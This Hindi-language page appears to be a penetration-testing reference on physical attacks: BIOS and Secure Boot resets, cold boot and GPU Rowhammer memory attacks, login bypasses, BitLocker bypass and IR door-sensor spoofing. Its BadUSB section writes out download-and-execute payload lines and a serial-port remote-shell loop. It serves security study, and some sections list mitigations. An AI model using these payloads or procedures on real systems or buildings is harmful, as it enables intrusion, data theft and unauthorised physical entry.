# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery और System Security

**BIOS को reset करना** कई तरीकों से किया जा सकता है। अधिकांश motherboards में एक **battery** होती है, जिसे लगभग **30 मिनट** के लिए निकालने पर BIOS settings, password सहित, reset हो जाती हैं। वैकल्पिक रूप से, इन settings को reset करने के लिए **motherboard पर jumper** को specific pins को connect करके adjust किया जा सकता है।

जहां hardware adjustments संभव या व्यावहारिक नहीं होते, वहां **software tools** समाधान प्रदान करते हैं। **Kali Linux** जैसे distributions के साथ **Live CD/USB** से system चलाने पर **_killCmos_** और **_CmosPWD_** जैसे tools उपलब्ध होते हैं, जो BIOS password recovery में सहायता कर सकते हैं।

जब BIOS password अज्ञात हो, तो इसे **तीन बार** गलत दर्ज करने पर आमतौर पर एक error code प्राप्त होता है। इस code का उपयोग [https://bios-pw.org](https://bios-pw.org) जैसी websites पर संभावित रूप से usable password प्राप्त करने के लिए किया जा सकता है।

### UEFI Security

Traditional BIOS के बजाय **UEFI** का उपयोग करने वाले modern systems के लिए, **chipsec** का उपयोग UEFI settings का analysis और modification करने के लिए किया जा सकता है, जिसमें **Secure Boot** को disable करना भी शामिल है। यह निम्नलिखित command से किया जा सकता है:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis और Cold Boot Attacks

Power कटने के बाद RAM कुछ समय तक data को बनाए रखती है, आमतौर पर **1 से 2 मिनट** तक। Liquid nitrogen जैसे ठंडे पदार्थ लगाने पर इस persistence को **10 मिनट** तक बढ़ाया जा सकता है। इस बढ़ी हुई अवधि के दौरान analysis के लिए **dd.exe** और **volatility** जैसे tools का उपयोग करके **memory dump** बनाया जा सकता है।

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब अधिक उपयोगी हो जाते हैं जब वे सामान्य buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर किए गए हालिया research से पता चलता है कि unprivileged CUDA code चलाने वाला attacker GPU-specific hammering patterns बना सकता है, paging structures को vulnerable rows में रखने के लिए **memory massaging** का उपयोग कर सकता है, और फिर **last-level page table** या किसी intermediate **page directory** में bits flip कर सकता है। जैसे ही कोई single translation entry corrupt होती है, attacker **arbitrary GPU memory read/write** प्राप्त कर सकता है और फिर host compromise की ओर pivot कर सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows** को profile करें और in-DRAM mitigations को bypass करने वाले refresh-aware / non-uniform hammering patterns बनाएं।
2. **GPU allocations को massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations पर रखे। व्यवहार में इसका अर्थ low-memory page-table region को exhaust करना और controlled strides के साथ large sparse UVM mappings को spray करना हो सकता है।
3. **PFN** या aperture-related bits जैसे **translation metadata** को page-table / page-directory entry के अंदर flip करें, ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory या host-visible system mappings पर resolve हो।
4. Forged mapping का पुनः उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts के बीच **arbitrary GPU memory read/write** तक privilege escalate करें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU के सामने arbitrary **host physical memory** expose कर सकती हैं, जिससे GPU primitive full host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अभी भी महत्वपूर्ण है क्योंकि यह GDDRHammer/GeForge द्वारा उपयोग किए जाने वाले direct arbitrary-host-memory path को block करता है, लेकिन यह **complete mitigation नहीं है**। **GPUBreach** एक second-stage pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver memory-safety bugs trigger करके kernel write primitive और **root shell** प्राप्त करता है, वह भी IOMMU enabled होने पर।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **system-level ECC** एक practical hardening step है। ECC के बिना consumer GPUs कमजोर defense surface प्रदान करते हैं।<sup>[[4]](#references)</sup>
- ये attacks केवल theoretical नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips report किए, जो working host-privilege-escalation chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** एक ऐसा tool है जिसे DMA के माध्यम से **physical memory manipulation** के लिए design किया गया है और यह **FireWire** तथा **Thunderbolt** जैसे interfaces के साथ compatible है। यह किसी भी password को स्वीकार करने के लिए memory को patch करके login procedures को bypass करने की अनुमति देता है। हालांकि, यह **Windows 10** systems के विरुद्ध ineffective है।

---

## System Access के लिए Live CD/USB

**_sethc.exe_** या **_Utilman.exe_** जैसे system binaries को **_cmd.exe_** की copy से बदलने पर system privileges वाला command prompt प्राप्त किया जा सकता है। Windows installation की **SAM** file को edit करने के लिए **chntpw** जैसे tools का उपयोग किया जा सकता है, जिससे passwords बदले जा सकते हैं।

**Kon-Boot** एक ऐसा tool है जो Windows systems में password जाने बिना login करने की सुविधा देता है, इसके लिए यह Windows kernel या UEFI को अस्थायी रूप से modify करता है। अधिक जानकारी [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) पर मिल सकती है।<sup>[[10]](#references)</sup>

---

## Windows Security Features को Handle करना

### Boot और Recovery Shortcuts

- **Supr**: BIOS settings access करें।
- **F8**: Recovery mode में प्रवेश करें।
- Windows banner दिखाई देने के बाद **Shift** दबाने से autologon bypass किया जा सकता है।

### BAD USB Devices

**Rubber Ducky** और **Teensyduino** जैसे devices **bad USB** devices बनाने के platforms के रूप में काम करते हैं। ये target computer से connect होने पर predefined payloads execute कर सकते हैं।

### Volume Shadow Copy

Administrator privileges के माध्यम से PowerShell द्वारा sensitive files, जिनमें **SAM** file भी शामिल है, की copies बनाई जा सकती हैं।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 आधारित implants जैसे **Evil Crow Cable Wind** USB-A→USB-C या USB-C↔USB-C cables के अंदर छिपे होते हैं, केवल USB keyboard के रूप में enumerate होते हैं और अपना C2 stack Wi-Fi के माध्यम से expose करते हैं। Operator को केवल victim host से cable को power देना होता है, `Evil Crow Cable Wind` नाम और `123456789` password वाला hotspot बनाना होता है, और embedded HTTP interface तक पहुंचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसका DHCP address) browse करना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के tabs होते हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts को on the fly switch किया जाता है और VID/PID strings को ज्ञात peripherals जैसा दिखने के लिए बदला जा सकता है।
- चूंकि C2 cable के अंदर रहता है, इसलिए phone host OS को touch किए बिना payloads stage कर सकता है, execution trigger कर सकता है और Wi-Fi credentials manage कर सकता है—कम dwell-time वाले physical intrusions के लिए ideal।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद fire करने के लिए bind करते हैं। Implant lightweight OS fingerprinting करता है और matching script select करता है।
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- चूंकि execution unattended होता है, इसलिए केवल charging cable बदलने से logged-on user context के अंतर्गत “plug-and-pwn” initial access प्राप्त किया जा सकता है।

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** एक stored payload console खोलता है और ऐसा loop paste करता है जो नए USB serial device पर आने वाली हर चीज को execute करता है। एक minimal Windows variant है:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** इम्प्लांट USB CDC channel को खुला रखता है, जबकि उसका ESP32-S3 operator को वापस एक TCP client (Python script, Android APK, या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए किसी भी bytes को ऊपर दिए गए serial loop में forward कर दिया जाता है, जिससे air-gapped hosts पर भी remote command execution मिलता है। Output सीमित होता है, इसलिए operators आमतौर पर blind commands (account creation, additional tooling की staging, आदि) चलाते हैं।

### HTTP OTA update surface

- यही web stack आमतौर पर unauthenticated firmware updates भी expose करता है। Evil Crow Cable Wind `/update` पर listen करता है और upload की गई किसी भी binary को flash कर देता है:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators engagement के बीच features को hot-swap कर सकते हैं (जैसे, flash USB Army Knife firmware), बिना cable खोले; इससे implant target host में plugged-in रहते हुए नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

यदि **recovery password** किसी memory dump file (**MEMORY.DMP**) में मिल जाए, तो BitLocker encryption को संभावित रूप से bypass किया जा सकता है। इस उद्देश्य के लिए **Elcomsoft Forensic Disk Decryptor** या **Passware Kit Forensic** जैसे tools का उपयोग किया जा सकता है।

---

## Recovery Key जोड़ने के लिए Social Engineering

Social engineering tactics के ज़रिए एक नई BitLocker recovery key जोड़ी जा सकती है। इसमें किसी user को ऐसा command execute करने के लिए मनाया जाता है जो zeros से बनी नई recovery key जोड़ता है, जिससे decryption process सरल हो जाती है।

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई modern laptops और small-form-factor desktops में एक **chassis-intrusion switch** होता है, जिसे Embedded Controller (EC) और BIOS/UEFI firmware monitor करते हैं। Switch का primary purpose device खोले जाने पर alert जारी करना होता है, लेकिन vendors कभी-कभी एक **undocumented recovery shortcut** implement करते हैं, जो switch को एक specific pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch EC पर एक **GPIO interrupt** से wired होता है।
2. EC पर चल रहा firmware **timing और presses की संख्या** को track करता है।
3. Hard-coded pattern पहचाने जाने पर, EC एक *mainboard-reset* routine invoke करता है, जो system NVRAM/CMOS के contents को **erase** कर देता है।
4. Next boot पर, BIOS default values load करता है – **supervisor password, Secure Boot keys और सभी custom configuration clear हो जाते हैं**।

> Secure Boot disable होने और firmware password हट जाने के बाद, attacker आसानी से कोई भी external OS image boot कर सकता है और internal drives तक unrestricted access प्राप्त कर सकता है।

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) का recovery shortcut है:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
दसवें cycle के बाद EC एक flag सेट करता है, जो BIOS को अगले reboot पर NVRAM wipe करने का निर्देश देता है। पूरी procedure में लगभग 40 s लगते हैं और इसके लिए **सिर्फ एक screwdriver** की आवश्यकता होती है।<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. Target को power-on करें या suspend-resume करें, ताकि EC चल रहा हो।
2. Intrusion/maintenance switch तक पहुंचने के लिए bottom cover हटाएं।
3. Vendor-specific toggle pattern दोहराएं (documentation, forums देखें या EC firmware को reverse-engineer करें)।
4. दोबारा assemble करके reboot करें – firmware protections disabled होनी चाहिए।
5. Live USB (जैसे Kali Linux) से boot करें और सामान्य post-exploitation करें (credential dumping, data exfiltration, malicious EFI binaries implant करना आदि)।

### Detection & Mitigation

* OS management console में chassis-intrusion events log करें और unexpected BIOS resets के साथ उनका correlation करें।
* Screws/covers पर **tamper-evident seals** लगाएं, ताकि opening का पता चल सके।
* Devices को **physically controlled areas** में रखें; मानकर चलें कि physical access का अर्थ full compromise है।
* जहां उपलब्ध हो, vendor के “maintenance switch reset” feature को disable करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक बनाएं।

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors एक near-IR LED emitter को TV-remote style receiver module के साथ pair करते हैं, जो सही carrier (लगभग 30 kHz) के कई pulses (~4–10) देखने के बाद ही logic high report करता है।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को एक-दूसरे की ओर सीधे देखने से रोकता है, इसलिए controller मानता है कि validated carrier पास के reflection से आया है और door strike खोलने वाला relay drive करता है।
- Controller के यह मानने के बाद कि target मौजूद है, outbound modulation envelope अक्सर बदल जाता है, लेकिन receiver filtered carrier से match करने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile capture करें** – controller pins के across एक logic analyser clip करें, ताकि internal IR LED को drive करने वाले pre-detection और post-detection दोनों waveforms record किए जा सकें।
2. **केवल “post-detection” waveform replay करें** – stock emitter को हटाएं/ignore करें और शुरुआत से ही पहले से triggered pattern के साथ external IR LED drive करें। चूंकि receiver केवल pulse count/frequency की परवाह करता है, वह spoofed carrier को genuine reflection मानकर relay line assert कर देता है।
3. **Transmission को gate करें** – carrier को tuned bursts (जैसे, दसियों milliseconds on और लगभग उतनी ही अवधि off) में transmit करें, ताकि receiver के AGC या interference handling logic को saturate किए बिना minimum pulse count deliver हो सके। Continuous emission sensor को जल्दी desensitise कर देती है और relay firing रुक जाती है।

### Long-Range Reflective Injection
- Bench LED को high-power IR diode, MOSFET driver और focusing optics से replace करने पर लगभग 6 m दूर से reliable triggering संभव हो जाती है।
- Attacker को receiver aperture के लिए line-of-sight की आवश्यकता नहीं होती; glass के through दिखाई देने वाली interior walls, shelving या door frames पर beam aim करने से reflected energy लगभग 30° field of view में प्रवेश कर सकती है और close-range hand wave जैसी प्रतीत होती है।
- चूंकि receivers केवल weak reflections की अपेक्षा करते हैं, इसलिए काफी stronger external beam कई surfaces से bounce होकर भी detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- Driver को commercial flashlight के अंदर embed करने से tool plain sight में छिप जाता है। Visible LED को receiver के band से matched high-power IR LED से replace करें, लगभग 30 kHz bursts generate करने के लिए ATtiny412 (या समान MCU) जोड़ें और LED current sink करने के लिए MOSFET का उपयोग करें।
- Telescopic zoom lens range/precision के लिए beam को narrow करता है, जबकि MCU control के तहत vibration motor visible light emit किए बिना modulation active होने की haptic confirmation देता है।
- कई stored modulation patterns (थोड़ी अलग carrier frequencies और envelopes) के बीच cycling करने से rebranded sensor families में compatibility बढ़ती है। इससे operator reflective surfaces को sweep कर सकता है, जब तक relay के audibly click करने और door release होने की आवाज न आए।

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
